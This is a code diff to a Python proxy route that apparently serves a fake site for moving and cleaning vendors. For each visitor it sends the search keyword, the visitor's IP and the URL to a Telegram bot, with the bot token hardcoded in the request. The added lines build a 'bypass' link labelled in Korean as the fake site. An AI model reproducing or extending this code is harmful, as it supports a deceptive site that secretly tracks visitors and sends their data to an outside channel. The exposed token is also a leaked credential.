@@ -1227,7 +1227,10 @@ def proxy_master_final(path):
             vendor_name = "B-모두클린" if t_param == 'B' else "A-이사방"
             full_url = request.url
             
-            msg = f"{vendor_name}\n키워드: {kr_keyword}\nIP: {client_ip}\nType: URL ({full_url})"
+            # Create bypass link for viewing fake site
+            bypass_url = full_url + ("&" if "?" in full_url else "?") + "bypass=1"
+            
+            msg = f"{vendor_name}\n키워드: {kr_keyword}\nIP: {client_ip}\n👁️ 가짜사이트: {bypass_url}"
             
             requests.get(
                 f"https://api.telegram.org/bot7983385122:AAGK4kjCDpmerqfSwQL66ZDPL2MSOEV4An0/sendMessage",
